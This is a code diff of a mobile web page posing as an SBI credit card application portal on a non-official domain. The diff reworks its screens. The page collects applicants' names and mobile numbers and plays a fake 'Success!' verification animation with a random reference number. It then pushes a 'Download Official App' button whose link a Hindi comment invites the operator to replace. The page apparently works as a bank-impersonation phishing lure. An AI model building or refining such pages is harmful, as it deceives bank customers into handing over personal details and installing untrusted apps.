@@ -39,15 +39,15 @@
       padding-bottom: 32px;
     }
 
-    .screen {
+    .layout {
       display: none;
     }
 
-    .screen.active {
+    .layout.active {
       display: block;
     }
 
-    /* Top SBI Banner */
+    /* ================= LAYOUT 1: HERO & FORM ================= */
     .hero-banner {
       background: linear-gradient(145deg, var(--sbi-blue-dark) 0%, var(--sbi-blue) 58%, var(--sbi-sky) 100%);
       color: #ffffff;
@@ -119,7 +119,6 @@
       color: #e2e8f0;
     }
 
-    /* Main Form Card */
     .form-card {
       background: var(--card-bg);
       margin: -14px 12px 16px;
@@ -279,7 +278,7 @@
       margin-top: 12px;
     }
 
-    /* Visual Credit Card Preview */
+    /* Visual Card Preview */
     .visual-card {
       margin: 0 12px 14px;
       border-radius: 16px;
@@ -364,7 +363,7 @@
       margin-left: -9px;
     }
 
-    /* Fee Summary Dark Box */
+    /* Fee Box */
     .fee-box {
       margin: 0 12px 18px;
       background: #0b192c;
@@ -413,7 +412,7 @@
       margin-top: 2px;
     }
 
-    /* Benefits Section */
+    /* Benefits */
     .benefits-heading {
       font-size: 17px;
       font-weight: 800;
@@ -458,7 +457,7 @@
       margin-top: 2px;
     }
 
-    /* Processing Modal Overlay */
+    /* ================= PROCESSING MODAL ================= */
     .process-overlay {
       position: fixed;
       inset: 0;
@@ -544,12 +543,12 @@
       flex-shrink: 0;
     }
 
-    /* Next Screen: Confirmation Layout */
+    /* ================= LAYOUT 2: CONFIRMATION & DOWNLOAD APP ================= */
     .result-banner {
       background: linear-gradient(145deg, var(--sbi-blue-dark) 0%, var(--sbi-blue) 100%);
       color: #ffffff;
-      padding: 18px;
-      text-align: center;
+      padding: 16px 18px;
+      text-align: left;
     }
 
     .result-banner .title {
@@ -562,19 +561,19 @@
       background: #ffffff;
       margin: 16px 12px;
       border-radius: 18px;
-      padding: 24px 18px;
+      padding: 26px 18px;
       border: 1px solid var(--border);
       box-shadow: 0 8px 24px rgba(0, 51, 102, 0.08);
       text-align: center;
     }
 
     .check-badge {
-      width: 56px;
-      height: 56px;
+      width: 58px;
+      height: 58px;
       border-radius: 50%;
-      background: #e6f2ff;
-      border: 2px solid var(--sbi-sky);
-      color: var(--sbi-blue);
+      background: #ecfdf5;
+      border: 2px solid #10b981;
+      color: #059669;
       font-size: 26px;
       font-weight: 800;
       display: flex;
@@ -594,17 +593,18 @@
       font-size: 13px;
       color: var(--text-muted);
       margin-bottom: 18px;
+      line-height: 1.5;
     }
 
     .ref-box {
-      border: 1.5px dashed #93c5fd;
-      background: #f8fbff;
+      border: 1.5px dashed #cbd5e1;
+      background: #f8fafc;
       border-radius: 12px;
       padding: 12px 14px;
       display: flex;
       align-items: center;
       justify-content: space-between;
-      margin-bottom: 18px;
+      margin-bottom: 16px;
       text-align: left;
     }
 
@@ -620,6 +620,7 @@
       font-weight: 800;
       color: var(--sbi-blue-dark);
       margin-top: 2px;
+      letter-spacing: 0.5px;
     }
 
     .copy-btn {
@@ -627,7 +628,7 @@
       color: var(--sbi-blue);
       border: 1px solid #bfdbfe;
       border-radius: 8px;
-      padding: 7px 12px;
+      padding: 7px 14px;
       font-size: 12px;
       font-weight: 700;
       cursor: pointer;
@@ -646,7 +647,7 @@
       font-size: 11px;
       font-weight: 800;
       letter-spacing: 0.7px;
-      color: var(--sbi-blue);
+      color: var(--text-muted);
       margin-bottom: 8px;
     }
 
@@ -656,7 +657,7 @@
       color: #334155;
       display: flex;
       flex-direction: column;
-      gap: 6px;
+      gap: 7px;
     }
 
     .next-list li::before {
@@ -665,17 +666,48 @@
       font-weight: 800;
     }
 
-    .secondary-btn {
+    /* Official App Download CTA */
+    .download-app-btn {
       width: 100%;
-      height: 44px;
-      border-radius: 10px;
-      border: 1.5px solid var(--sbi-blue);
-      background: #ffffff;
-      color: var(--sbi-blue);
-      font-size: 14px;
+      height: 50px;
+      border-radius: 12px;
+      background: #0b192c;
+      color: #ffffff;
+      font-size: 15px;
       font-weight: 700;
-      cursor: pointer;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 9px;
+      box-shadow: 0 8px 18px rgba(11, 25, 44, 0.22);
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .download-app-btn:hover {
+      background: var(--sbi-blue-dark);
+    }
+
+    .download-app-btn:active {
+      transform: scale(0.99);
+    }
+
+    .app-subnote {
+      font-size: 12px;
+      color: var(--text-muted);
       margin-top: 10px;
+    }
+
+    .back-link {
+      display: inline-block;
+      margin-top: 14px;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--sbi-sky);
+      background: none;
+      border: none;
+      cursor: pointer;
+      text-decoration: underline;
     }
 
     /* Footer */
@@ -683,7 +715,7 @@
       text-align: center;
       font-size: 12px;
       color: var(--text-muted);
-      margin-top: 22px;
+      margin-top: 20px;
       padding: 0 16px;
     }
 
@@ -696,8 +728,8 @@
 </head>
 <body>
   <div class="container">
-    <!-- SCREEN 1: FORM & CARD OVERVIEW -->
-    <div id="formScreen" class="screen active">
+    <!-- ==================== LAYOUT 1: FORM SCREEN ==================== -->
+    <div id="layout1" class="layout active">
       <header class="hero-banner">
         <div class="top-bar">
           <div>
@@ -850,23 +882,23 @@
       </div>
     </div>
 
-    <!-- SCREEN 2: NEXT LAYOUT AFTER PROCESSING -->
-    <div id="resultScreen" class="screen">
-      <div class="result-banner">
+    <!-- ==================== LAYOUT 2: APPLICATION RECEIVED + DOWNLOAD APP ==================== -->
+    <div id="layout2" class="layout">
+      <header class="result-banner">
         <div class="title">SBI CREDIT CARD</div>
-      </div>
+      </header>
 
-      <div class="result-card">
+      <main class="result-card">
         <div class="check-badge">&#10003;</div>
-        <h2 class="result-heading">Request Received!</h2>
+        <h2 class="result-heading">Application Received!</h2>
         <p class="result-text" id="summaryText">
-          Thank you. Your service request has been recorded and will be reviewed shortly on your registered mobile number.
+          Thank you for your interest. Our team will review your details and reach out to you shortly on your registered mobile number.
         </p>
 
         <div class="ref-box">
           <div>
             <div class="ref-label">REFERENCE NO.</div>
-            <div class="ref-code" id="refCode">SBI8492014</div>
+            <div class="ref-code" id="refCode">SBI7EAD4732</div>
           </div>
           <button type="button" class="copy-btn" id="copyRefBtn">Copy</button>
         </div>
@@ -874,60 +906,67 @@
         <div class="next-box">
           <div class="next-title">WHAT'S NEXT</div>
           <ul class="next-list">
-            <li>Service: <strong id="outService">-</strong></li>
-            <li>Applicant: <strong id="outName">-</strong></li>
-            <li>Mobile: <strong id="outMobile">-</strong></li>
-            <li>Review &amp; verification update within 24&ndash;48 hours</li>
+            <li>Service Selected: <strong id="outService">-</strong></li>
+            <li>Review within 24&ndash;48 hours</li>
+            <li>Call on your registered mobile (<strong id="outMobile">-</strong>)</li>
             <li>No upfront payment required</li>
           </ul>
         </div>
 
-        <button type="button" class="submit-btn" id="newRequestBtn">
-          Submit Another Request
-        </button>
-        <button type="button" class="secondary-btn" id="backHomeBtn">
-          Back to Overview
-        </button>
+        <!-- Yahan apna SBI Credit Card App link set hoga -->
+        <a id="downloadAppBtn" class="download-app-btn" href="https://play.google.com/store/apps/details?id=com.sbi.lotusintouch" target="_blank" rel="noopener noreferrer">
+          <span>&#8681;</span> Download Official App
+        </a>
 
-        <div class="ssl-note">&#128274; Secure Connection &bull; Data Protected</div>
-      </div>
+        <div class="app-subnote">Install the official app to track your application.</div>
+        <div class="ssl-note">&#128274; Secure Connection</div>
+
+        <button type="button" class="back-link" id="backHomeBtn">Submit Another Request</button>
+      </main>
     </div>
 
     <footer class="footer" id="privacy">
-      <div>&copy; 2026 All rights reserved</div>
-      <div style="margin-top: 4px;">support@sbicard-portal.example &bull; +91 98765 43210</div>
-      <div style="margin-top: 4px;"><a href="#top">Privacy Policy</a></div>
+      <div>Need help? <a href="mailto:support@sbicard-portal.example">support@sbicard-portal.example</a></div>
+      <div style="margin-top: 6px;">&copy; 2026 All rights reserved</div>
     </footer>
   </div>
 
-  <!-- PROCESSING STEP MODAL ON SUBMIT -->
+  <!-- PROCESSING STEP MODAL -->
   <div id="processOverlay" class="process-overlay" role="dialog" aria-modal="true">
     <div class="process-modal">
       <div class="spinner"></div>
-      <div class="process-title">Processing...</div>
-      <div class="process-sub">Redirecting to next step...</div>
+      <div class="process-title">Success!</div>
+      <div class="process-sub">Redirecting...</div>
 
       <div class="step-list">
         <div class="step-item active" id="step1">
           <span class="step-dot"></span> Validating your details...
         </div>
         <div class="step-item" id="step2">
-          <span class="step-dot"></span> Checking service request...
+          <span class="step-dot"></span> Checking eligibility...
         </div>
         <div class="step-item" id="step3">
-          <span class="step-dot"></span> Generating reference number...
+          <span class="step-dot"></span> Securing your application...
         </div>
       </div>
     </div>
   </div>
 
   <script>
+    // =========================================================
+    // YAHAN APNA SBI CREDIT CARD APP KA LINK LAGAYEIN:
+    const APP_DOWNLOAD_LINK = "https://play.google.com/store/apps/details?id=com.sbi.lotusintouch";
+    // =========================================================
+
+    const downloadAppBtn = document.getElementById("downloadAppBtn");
+    downloadAppBtn.href = APP_DOWNLOAD_LINK;
+
     const fullNameInput = document.getElementById("fullName");
     const previewName = document.getElementById("previewName");
     const form = document.getElementById("sbiCardForm");
 
-    const formScreen = document.getElementById("formScreen");
-    const resultScreen = document.getElementById("resultScreen");
+    const layout1 = document.getElementById("layout1");
+    const layout2 = document.getElementById("layout2");
     const processOverlay = document.getElementById("processOverlay");
 
     const step1 = document.getElementById("step1");
@@ -936,11 +975,9 @@
 
     const refCodeEl = document.getElementById("refCode");
     const outService = document.getElementById("outService");
-    const outName = document.getElementById("outName");
     const outMobile = document.getElementById("outMobile");
     const summaryText = document.getElementById("summaryText");
     const copyRefBtn = document.getElementById("copyRefBtn");
-    const newRequestBtn = document.getElementById("newRequestBtn");
     const backHomeBtn = document.getElementById("backHomeBtn");
 
     fullNameInput.addEventListener("input", () => {
@@ -949,8 +986,12 @@
     });
 
     function generateRefNo() {
-      const rand = Math.floor(1000000 + Math.random() * 9000000);
-      return "SBI" + rand;
+      const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+      let code = "SBI";
+      for (let i = 0; i < 8; i++) {
+        code += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return code;
     }
 
     function resetSteps() {
@@ -982,18 +1023,16 @@
       setTimeout(() => {
         step3.className = "step-item done";
 
-        const refNo = generateRefNo();
-        refCodeEl.textContent = refNo;
+        refCodeEl.textContent = generateRefNo();
         outService.textContent = service;
-        outName.textContent = name;
         outMobile.textContent = "+91 " + mobile;
-        summaryText.textContent = `Thank you, ${name}. Your "${service}" request has been recorded and will be updated on +91 ${mobile}.`;
+        summaryText.textContent = `Thank you, ${name}. Our team will review your "${service}" request and reach out to you shortly on your registered mobile number.`;
 
         processOverlay.classList.remove("show");
-        formScreen.classList.remove("active");
-        resultScreen.classList.add("active");
+        layout1.classList.remove("active");
+        layout2.classList.add("active");
         window.scrollTo({ top: 0, behavior: "smooth" });
-      }, 2050);
+      }, 2100);
     });
 
     copyRefBtn.addEventListener("click", () => {
@@ -1004,16 +1043,13 @@
       }, 1500);
     });
 
-    function goToForm() {
+    backHomeBtn.addEventListener("click", () => {
       form.reset();
       previewName.textContent = "CARD HOLDER";
-      resultScreen.classList.remove("active");
-      formScreen.classList.add("active");
+      layout2.classList.remove("active");
+      layout1.classList.add("active");
       window.scrollTo({ top: 0, behavior: "smooth" });
-    }
-
-    newRequestBtn.addEventListener("click", goToForm);
-    backHomeBtn.addEventListener("click", goToForm);
+    });
   </script>
 </body>
 </html>
